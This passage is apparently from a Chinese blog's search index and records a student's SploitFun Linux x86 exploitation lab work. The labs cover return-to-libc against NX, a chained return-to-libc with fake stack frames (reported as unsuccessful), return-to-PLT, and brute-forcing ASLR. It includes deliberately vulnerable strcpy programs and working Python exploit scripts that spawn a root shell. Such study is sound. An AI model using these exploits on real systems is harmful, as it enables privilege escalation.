class="hljs-comment">/* [4] */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>
+<h2 id="2编译以及溢出点"><a class="markdownIt-Anchor" href="#2编译以及溢出点"></a> 2.编译以及溢出点</h2>
+<p>以下是编译过程，没有添加-z execstack的参数进行编译，说明现在堆栈是不可执行的</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730172751113.png" alt="image-20210730172751113" style="zoom:80%;">                      
+<p>这时可以看到堆栈段只包含读写，不能执行</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173004437.png" alt="image-20210730173004437" style="zoom:80%;">
+<p>如何绕过NX位并实现任意代码执行？</p>
+<p>可以使用叫做“return-to-libc”的攻击技术绕过NX 位。这里返回地址被一个特定的 libc函数地址覆盖（而不是包含shellcode的堆栈地址）。例如，如果攻击者想要生成一个shell，那么他将使用 system 地址覆盖返回地址，并在堆栈中设置 system 所需的相应参数，以便成功调用它。</p>
+<p>首先我们得找到system等地址</p>
+<p>通过调试可以找到</p>
+<p><strong>system地址为0xb7e5f460</strong></p>
+<p><strong>Exit地址为0xb7e52fe0</strong></p>
+<p><strong>/bin/sh地址为0xb7f81ff8</strong></p>
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173054568.png" alt="image-20210730173054568" style="zoom:80%;">
+<h2 id="3-构建exp攻击"><a class="markdownIt-Anchor" href="#3-构建exp攻击"></a> 3. 构建exp攻击</h2>
+<p>有了上述条件，我们可以构建这样的exp</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#exp.py</span><br>#!/usr/bin/env python<br><span class="hljs-keyword">import</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class"><span class="hljs-title">from</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">import</span> <span class="hljs-title">call</span></span><br><span class="hljs-class"><span class="hljs-title">system</span> =</span>  <span class="hljs-number">0xb7e5f460</span> <br><span class="hljs-built_in">exit</span> = <span class="hljs-number">0xb7e52fe0</span> <br>binsh_arg = <span class="hljs-number">0xb7f81ff8</span><br><span class="hljs-meta">#endianess conversion</span><br>def conv(num):<br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-meta">#system + exit + system_arg</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">268</span><br>buf += conv(system)<br>buf += conv(<span class="hljs-built_in">exit</span>)<br>buf += conv(binsh_arg)<br>print bu	f<br>print <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br>call([<span class="hljs-string">&quot;./vuln&quot;</span>, buf])<br><br></code></pre></td></tr></table></figure>
+<p>测试成功拿到rootshell</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173210271.png" alt="image-20210730173210271" style="zoom:80%;">
+<h1 id="实验五使用链式-return-to-libc-绕过-nx-位未成功"><a class="markdownIt-Anchor" href="#实验五使用链式-return-to-libc-绕过-nx-位未成功"></a> 实验五：使用链式 return-to-libc 绕过 NX 位（未成功）</h1>
+<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
+<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
+<h2 id="1原理"><a class="markdownIt-Anchor" href="#1原理"></a> 1.原理</h2>
+<p><strong>漏洞代码：</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br>seteuid(getuid()); <span class="hljs-comment">/* Temporarily drop privileges */</span><br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><strong>什么是最小权限原则？</strong></p>
+<p>此技术允许root setuid程序仅在需要时获取root权限。这指的是当需要时，获得root 权限，当不需要它们时，它将丢弃获得的root权限。正常做法是root setuid程序之 后，用户获取输入之前删除root权限。因此，即使用户输入是恶意的，攻击者也不 会得到root shell。例如下面的漏洞代码不允许攻击者获取root shell。</p>
+<p>如上所述，链接 setuid ， system 和 exit 将允许我们能够利用漏洞 代码 vuln 。但由于以下两个问题，不是一个直接的任务：</p>
+<p>1、在堆栈中的同一位置，攻击者将需要放置libc函数的函数参数或一个libc函数的 函数参数和另一个libc函数的地址，这显然是不可能的（如下图所示）。 2、 seteuid_arg 应为零，但是strcpy遇到\00会结束输入，所以我们得找到一个字符串0的地址来避免这个问题</p>
+<p>调用以下libc函数（按照列出的顺序）</p>
+<p>seteuid(0)</p>
+<p>system(“sh”)</p>
+<p>exit()</p>
+<p>构建rop链就可以获得root shell。</p>
+<h2 id="2攻击思路"><a class="markdownIt-Anchor" href="#2攻击思路"></a> 2.攻击思路</h2>
+<p>通过leave ret构建假栈帧，执行我们的rop链，因为strcpy函数会对\x00进行截断，我们要构建setuid（0）这个rop链接，只能通过4个sprintf函数把4个\x00拷到栈上。</p>
+<p>Leave ret 这个指令汇编是</p>
+<p><strong>mov esp ebp</strong></p>
+<p><strong>pop ebp</strong></p>
+<p><strong>pop eip</strong></p>
+<p>通过这几个指令可以把我们伪造的fake_ebp变成下一个栈的栈底，然后执行fake_ebp+4位置的指令，从而可以按顺序执行我们构造的rop链。</p>
+<p>我们需要构造4个sprintf函数把\x00拷贝到setuid()函数的参数位置，然后继续构建fake_ebp执行setuid()，system(/bin/sh)就可以拿到rootshell</p>
+<p>编译完成后，查看mian函数的堆栈</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173554156.png" alt="image-20210730173554156" style="zoom:80%;">         
+<p>尝试输入268个A和4个B</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173611629.png" alt="image-20210730173611629" style="zoom:80%;">
+<p>可以知道eip的位置还是之前的268个A的后面4位</p>
+<p>题目原理是伪造栈，进行栈迁移，然后把0复制到栈上进行操作，但是我实际操作时遇到了诸多问题</p>
+<ol>
+<li>
+<p>题目中strcpy函数不可以用，但是在我使用的libc上是可用的，可以通过strcpy把libc上strcpy函数的地址复制到栈上，所以题目中用了sprintf函数</p>
+</li>
+<li>
+<p>但是实际上在我使用sprintf函数时，它的地址会被截断，无法使用</p>
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173658115.png" alt="image-20210730173658115" style="zoom:80%;">
+</li>
+</ol>
+<p>这里我sprintf函数的地址是0xb7e6b920，会导致这个函数之后的rop链接复制不了</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173712364.png" alt="image-20210730173712364" style="zoom:80%;">
+<ol start="3">
+<li>实际上我也使用其他乌班图尝试了一下，但是sprintf函数并不能把字符复制到栈上，如下，这里rop链可以执行，但是并不能复制到栈上，我也不知道为什么</li>
+</ol>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173731850.png" alt="image-20210730173731850" style="zoom:80%;">
+<p>这是sprintf的3个参数设定，经过调试知道题中是把0xbffff23c地址的00复制到0xbffff210，0xbffff23c的位置是strcpy截断的\00的位置</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173811988.png" alt="image-20210730173811988" style="zoom:80%;">
+<p>实际上这里rop链在sprintf函数中就会突然跳转到一个错误地址然后停止，</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173833967.png" alt="image-20210730173833967" style="zoom:80%;">
+<p><strong>基于以上原因，我只能借用了同学的一个可以完成此实验的环境进行调试</strong></p>
+<p>这里的sprintf函数地址是0xb7e6cf80，不会被strcpy截断</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173851194.png" alt="image-20210730173851194" style="zoom:80%;">
+<p>/bin/sh的地址是0xb7f81ff8</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173912815.png" alt="image-20210730173912815" style="zoom:80%;">
+<p>我们构建的栈空间应该是这样的</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173936029.png" alt="image-20210730173936029" style="zoom:80%;">
+<p>把构造的exp输入栈后，栈空间是这样的，需要把0xbffff274位置的\x00复制到0xbffff250位置，复制4次，每次加1</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730174002589.png" alt="image-20210730174002589" style="zoom:80%;">
+<p>Payload脚本如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct <br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call <br>fake_ebp0 = <span class="hljs-number">0xbffff1e0</span><br>fake_ebp1 = <span class="hljs-number">0xbffff1f8</span> <br>fake_ebp2 = <span class="hljs-number">0xbffff210</span> <br>fake_ebp3 = <span class="hljs-number">0xbffff228</span> <br>fake_ebp4 = <span class="hljs-number">0xbffff244</span> <br>fake_ebp5 = <span class="hljs-number">0xbffff254</span> <br>fake_ebp6 = <span class="hljs-number">0xbffff264</span> <br>fake_ebp7 = <span class="hljs-number">0xbffff274</span> <br>leave_ret = <span class="hljs-number">0x0804851c</span> <br>sprintf_addr = <span class="hljs-number">0xb7e6cf80</span> <br>seteuid_addr = <span class="hljs-number">0xb7f08970</span><br>system_addr = <span class="hljs-number">0xb7e5f460</span> <br>exit_addr = <span class="hljs-number">0xb7e52fe0</span> <br>sprintf_arg1 = <span class="hljs-number">0xbffff250</span> <br>sprintf_arg2 = <span class="hljs-number">0x80485f0</span> <br>sprintf_arg3 = <span class="hljs-number">0xbffff274</span><br>binsh_arg = <span class="hljs-number">0xb7f81ff8</span><br>exit_arg = <span class="hljs-number">0xffffffff</span> <br><span class="hljs-comment">#endianess convertion </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span> <br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<br>buf=<span class="hljs-string">&quot;A&quot;</span>* <span class="hljs-number">264</span><br>buf += conv(fake_ebp0) <br>buf += conv(leave_ret) <br><span class="hljs-comment">#Below four stack frames are for sprintf (to setup seteuid arg ) </span><br>buf += conv(fake_ebp1) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret) <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br>buf += conv(fake_ebp2) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret)<br>sprintf_arg1 += <span class="hljs-number">1</span> <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br>buf += conv(fake_ebp3) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret) <br>sprintf_arg1 += <span class="hljs-number">1</span> <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br>buf += conv(fake_ebp4) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret) <br>sprintf_arg1 += <span class="hljs-number">1</span> <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br><span class="hljs-comment">#Dummy - To avoid null byte in fake_ebp4. </span><br>buf += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">4</span> <br><span class="hljs-comment">#Below stack frame is for seteuid </span><br>buf += conv(fake_ebp5) <br>buf += conv(seteuid_addr) <br>buf += conv(leave_ret) <br><span class="hljs-comment">#Dummy - This arg is zero&#x27;d by above four sprintf calls </span><br>buf += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">4</span> <br><span class="hljs-comment">#Below stack frame is for system </span><br>buf += conv(fake_ebp6) <br>buf += conv(system_addr) <br>buf += conv(leave_ret) <br>buf += conv(binsh_arg) <br><span class="hljs-comment">#Below stack frame is for exit </span><br>buf += conv(fake_ebp7) <br>buf += conv(exit_addr) <br>buf += conv(leave_ret) <br>buf += conv(exit_arg) <br><span class="hljs-built_in">print</span> buf <br><span class="hljs-comment">#print &quot;Calling vulnerable program&quot; </span><br><span class="hljs-comment">#call([&quot;./vuln&quot;, buf])</span><br></code></pre></td></tr></table></figure>
+<h1 id="实验六绕过aslr-第一部分"><a class="markdownIt-Anchor" href="#实验六绕过aslr-第一部分"></a> 实验六：绕过ASLR – 第一部分</h1>
+<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
+<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
+<h2 id="1原理书中内容"><a class="markdownIt-Anchor" href="#1原理书中内容"></a> 1．原理（书中内容）</h2>
+<p>什么是 ASLR?</p>
+<p>地址空间布局随机化（ASLR）是随机化的利用缓解技术: 堆栈地址 堆地址 共享库地址 一旦上述地址被随机化，特别是当共享库地址被随机化时，我们采取的绕过NX 位的方法不会生效，因为攻击者需要知道libc基地址。但这种缓解技术并不完全是万无一失的。</p>
+<p>libc函数地址计算如下：</p>
+<p>libc函数地址 = libc 基址 + 函数偏移</p>
+<p><strong>什么是return-to-plt?</strong></p>
+<p>在这种技术中，而不是返回到libc函数（其地址是随机的）攻击者返回到一个函数的PLT（其地址不是随机的-其地址在执行之前已知）。由于 function@PLT 不是随机的，所以攻击者不再需要预测libc的基地址，而是可以简单地返回到 function@PLT 来调用 function 。</p>
+<p><strong>什么是PLT</strong>**，如何通过调用 function@PLT** <strong>来调用“函数”？</strong></p>
+<p>要了解过程链接表（PLT），先让我简要介绍一下共享库！</p>
+<p>与静态库不同，共享库代码段在多个进程之间共享，而其数据段对于每个进程是唯一的。这有助于减少内存和磁盘空间。由于代码段在多个进程之间共享，所以应该只有 read 和 execute 权限，因此动态链接器不能重新定位代码段中存在的数据符号或函数地址（因为它没有写权限）。那么动态链接如何在运行时重新定位共享库符号而不修改其代码段?它使用PIC完成！</p>
+<p><strong>什么是PIC</strong>**？**</p>
+<p>位置无关代码（PIC）是为了解决这个问题而开发的 - 它确保共享库代码段在多个 进程之间共享，尽管在加载时执行重定位。PIC通过一级间接寻址实现这一点-共享 库代码段不包含绝对虚拟地址来代替全局符号和函数引用，而是指向数据段中的特定表。该表是全局符号和函数绝对虚拟地址的占位符。动态链接器作为重定位的一部分来填充此表。因此，只有重定位数据段被修改，代码段保持不变！ 动态链接器以两种不同的方式重新定位PIC中发现的全局符号和函数，如下所述：</p>
+<p><strong>全局偏移表（GOT</strong>**）**： 全局偏移表包含每个全局变量的4字节条目，其中4字节条目包含全局变量的地址。 当代码段中的指令引用全局变量时，而不是全局变量的绝对虚拟地址，指令指向 GOT中条目。当加载共享库时，GOT条目由动态链接器重新定位。因此，PIC使用 该表来重新定位具有单个间接级别的全局符号。</p>
+<p><strong>过程链接表（PLT</strong>**）**： 过程链接表包含每个全局函数的存根代码。代码段中的调用 指令不直接调用函数（ function ），而是调用存根代码 （ function @ PLT ）。这个存根代码在动态链接器的帮助下解析了函数地址并将其复制到GOT（ GOT [n] ）。这次解析仅在函数（ function ）的第一次调用 期间发生，稍后当代码段中的调用指令调用存根代码（ function @PLT ）时，而</p>
+<p>不是调用动态链接器来解析函数地址（ function ）存根代码直接从 GOT（ GOT [n] ）获取功能地址并跳转到它。因此，PIC使用这个表来重新定位 具有两级间接的功能地址。</p>
+<p>漏洞代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">/* Eventhough shell() function isnt invoked directly, its needed</span><br><span class="hljs-comment">here since &#x27;system@PLT&#x27; and &#x27;exit@PLT&#x27; stub code should be pres</span><br><span class="hljs-comment">ent in executable to successfully exploit it. */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h2 id="2漏洞利用"><a class="markdownIt-Anchor" href="#2漏洞利用"></a> 2.漏洞利用</h2>
+<p>首先反汇编查看程序</p>
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102132605.png" alt="image-20210802102132605" style="zoom:80%;">         
+<p>这样可以看到system和exit的地址</p>
+<p>然后使用ida查看‘bin/sh’的地址为0x0804850</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102157354.png" alt="image-20210802102157354" style="zoom:80%;">
+<p>构建exp如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exp.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br>system = <span class="hljs-number">0x8048380</span><br>exit = <span class="hljs-number">0x80483a0</span><br>binsh = <span class="hljs-number">0x080485B0</span> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#system + exit + system_arg</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">272</span><br>buf += conv(system)<br>buf += conv(exit)<br>buf += conv(binsh)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br>call([<span class="hljs-string">&quot;./vuln&quot;</span>, buf])<br><br></code></pre></td></tr></table></figure>
+<p>成功得到rootshell</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102245437.png" alt="image-20210802102245437" style="zoom:80%;">
+<h1 id="实验七绕过-aslr-第二部分"><a class="markdownIt-Anchor" href="#实验七绕过-aslr-第二部分"></a> 实验七：绕过 ASLR – 第二部分</h1>
+<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
+<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
+<h2 id="1-原理-4"><a class="markdownIt-Anchor" href="#1-原理-4"></a> 1． 原理</h2>
+<p>漏洞代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>编译过程：</p>
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102403136.png" alt="image-20210802102403136" style="zoom:80%;">
+<p>验证当随机化打开时不同的 Libc 基址：</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102421800.png" alt="image-20210802102421800" style="zoom:80%;">
+<p>可以看到，Libc 随机化仅限于3个十六进制位。而且前面只有0xb75和0xb76因此我们可以在最多 256 x2次尝试内，得到 root shell。</p>
+<p>所以编写一个循环爆破脚本。</p>
+<h2 id="2找到地址构建exp"><a class="markdownIt-Anchor" href="#2找到地址构建exp"></a> 2.找到地址，构建exp</h2>
+<p>我们先用指令寻找system以及exit的偏移地址</p>
+<p>输入readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit</p>
+<p>所以exit的偏移地址是0x00032fe0</p>
+<p>输入readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102441989.png" alt="image-20210802102441989" style="zoom:80%;">
+<p>得到system的偏移地址0x0003f460</p>
+<p>输入strings -a -t x /lib/i386-linux-gnu/libc.so.6 |grep “/bin/sh”</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102457948.png" alt="image-20210802102457948" style="zoom:80%;">
+<p>得到/bin/sh的偏移地址是0x161ff8</p>
+<p>我们选择一个libc基址为0xb7525000进行爆破</p>
+<p>*这里由于自己找到的/bin/sh基址使用会报错，不知道为啥解决不了，只好使用报告里的/bin/sh地址</p>
+<p>构建exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#exp.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br>libc_base_addr = <span class="hljs-number">0xb7525000</span>   <span class="hljs-comment">#猜测的libc基址</span><br>exit_off = <span class="hljs-number">0x00032fe0</span>    <span class="hljs-comment">#exit偏移</span><br>system_off = <span class="hljs-number">0x0003f460</span>   <span class="hljs-comment">#system偏移</span><br>system_addr = libc_base_addr + system_off<br>exit_addr = libc_base_addr + exit_off<br>binsh = <span class="hljs-number">0x804827d</span>  <span class="hljs-comment">#bin/sh地址</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#system + exit + system_arg</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">268</span><br>buf += conv(system_addr)<br>buf += conv(exit_addr)<br>buf += conv(binsh)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br><span class="hljs-comment">#Multiple tries until we get lucky</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">512</span>):<br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Number of tries: %d&quot;</span> %i<br>  i += <span class="hljs-number">1</span><br>  ret = call([<span class="hljs-string">&quot;./vuln&quot;</span>, buf])<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> ret):<br>   <span class="hljs-keyword">break</span><br>  <span class="hljs-keyword">else</span>:<br>   <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Exploit failed&quot;</span><br><br></code></pre></td></tr></table></figure>
+<p>如下，循环到365时成功爆破得到rootshell</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102532162.png" alt="image-20210802102532162" style="zoom:80%;">
+]]></content>
+      <categories>
+        <category>PWN学习</category>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>PWN学习</tag>
+      </tags>
   </entry>
 </search>
